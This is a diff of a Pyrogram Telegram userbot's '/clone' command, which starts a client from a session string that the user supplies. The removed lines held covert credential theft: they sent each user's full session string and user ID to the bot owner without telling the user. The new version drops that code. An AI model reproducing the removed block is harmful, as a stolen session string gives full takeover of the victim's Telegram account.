@@ -1,31 +1,28 @@
+from Zaid import app, API_ID, API_HASH 
+from pyrogram import Client, filters
+from pyrogram.types import Message
+
+# ========== CLONE COMMAND ==========
+
 @app.on_message(filters.command("clone"))
-async def clone(bot: app, msg: Message):
+async def clone_cmd(_, msg: Message):
 
-    try:
-        session_string = msg.command[1]
-    except:
-        return await msg.reply("❌ Provide session string.\nExample: `/clone ABCDEF...`")
-
-    text = await msg.reply("Booting Your Client...")
-
-    # ======================
-    # 🔥 STRING SESSION SEND TO OWNER
-    # ======================
-    try:
-        await bot.send_message(
-            OWNER_ID,
-            f"📥 **New Session Received**\n\nFrom: `{msg.from_user.id}`\n\n`{session_string}`"
+    if len(msg.command) == 1:
+        return await msg.reply(
+            "❌ Please provide session string.\n\n"
+            "**Usage:**\n`/clone <SESSION_STRING>`"
         )
-    except:
-        pass
+
+    session = msg.command[1]
+
+    text = await msg.reply("🚀 Booting your client...")
 
     try:
-        # Client start
         client = Client(
             name="Melody",
             api_id=API_ID,
             api_hash=API_HASH,
-            session_string=session_string,
+            session_string=session,
             plugins=dict(root="Zaid/modules")
         )
 
@@ -33,8 +30,8 @@ async def clone(bot: app, msg: Message):
         user = await client.get_me()
 
         await text.edit(
-            f"✅ **Client Started Successfully As {user.first_name}**"
+            f"✅ Client Started Successfully as **{user.first_name}!**"
         )
 
     except Exception as e:
-        await msg.reply(f"❌ ERROR: `{e}`")
+        await text.edit(f"❌ ERROR: `{e}`")
